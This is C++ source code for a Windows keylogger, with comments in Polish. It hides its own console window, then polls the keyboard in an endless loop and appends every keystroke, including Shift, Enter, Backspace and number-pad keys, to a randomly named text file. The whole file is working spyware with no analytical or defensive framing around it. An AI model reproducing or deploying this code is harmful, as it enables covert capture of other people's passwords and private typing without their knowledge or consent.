#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <fstream>
#include <ctime>
#include <windows.h>
#include <string>
#define czas 1000
using namespace std;
int main()
{
///ukrywanie okna
HWND stealth; //Uchwyt do okna
AllocConsole();
stealth=FindWindowA("ConsoleWindowClass",NULL);
ShowWindow(stealth,0);
///

srand(time(NULL));
string name;
name.clear();
name=name +(char)(rand()%25+97);
name=name +(char)(rand()%25+97);
name=name +(char)(rand()%25+97);
name=name + ".txt";
clock_t time;
clock_t lasttime=clock();
bool ifstart=true;
unsigned int Char;
string proba;
 fstream file;
    while(1)
    {

        Sleep(20);
         for(Char = 3; Char <= 500; Char++)
        {



            if(ifstart)
            {

                file.open(name,ios_base::out|ios_base::app);
                ifstart=false;
            }

            if(GetAsyncKeyState(Char)==-32767)
            {

                if((Char>=33)&&(Char<=90))
                {

                        file <<(char)Char;
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;

                        }

                }
                else
                {
                    switch(Char)
                    {
                        case VK_SPACE:
                        file<<"' '";
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;
                        }
                        break;

                        case VK_SHIFT:
                        file<<"[shift]"<<" ";
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;
                        }
                        break;

                        case VK_RETURN:
                        file<<"[enter]\n";
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;
                        }
                        break;
                        case VK_BACK:
                        file<<"[backspace]";
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;
                        }
                        break;
                        case VK_TAB:
                        file<<"[tab]";
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;
                        }
                        break;
                        case VK_CONTROL:
                        file<<"[ctrl]";
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;
                        }
                        break;
                        case VK_DELETE:
                        file<<"[del]";
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;
                        }
                        break;
                        case VK_OEM_1:
                        file<<"[;:]";
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;
                        }
                        break;
                        case VK_OEM_2:
                        file<<"[/?]";
                        if(clock()-lasttime>czas)
                        {
                            file.flush();
                            file.close();
                            lasttime=clock();
                            ifstart=true;
                        }
                        break;

                        case VK_OEM_3:
                        file<<"ö";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;
                        case VK_OEM_4:
                        file<<"[[{]";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;
                        case VK_OEM_5:
                        file<<"[\\|]";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_OEM_6:
                        file<<"a*";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_OEM_7:
                        file<<"ä";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD0:
                        file<<"'0'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD1:
                        file<<"'1'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD2:
                        file<<"'2'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD3:
                        file<<"'3'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD4:
                        file<<"'4'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD5:
                        file<<"'5'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD6:
                        file<<"'6'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD7:
                        file<<"'7'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD8:
                        file<<"'8'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_NUMPAD9:
                        file<<"'9'";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        case VK_CAPITAL:
                        file<<"[caps lock]";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;

                        default:
                        file<<"other<<"<<Char<<">>other \n";
                            if(clock()-lasttime>czas)
                            {
                                file.flush();
                                file.close();
                                lasttime=clock();
                                ifstart=true;
                            }
                        break;
                        }

                }

            }
        }
    }

    return 0;
}
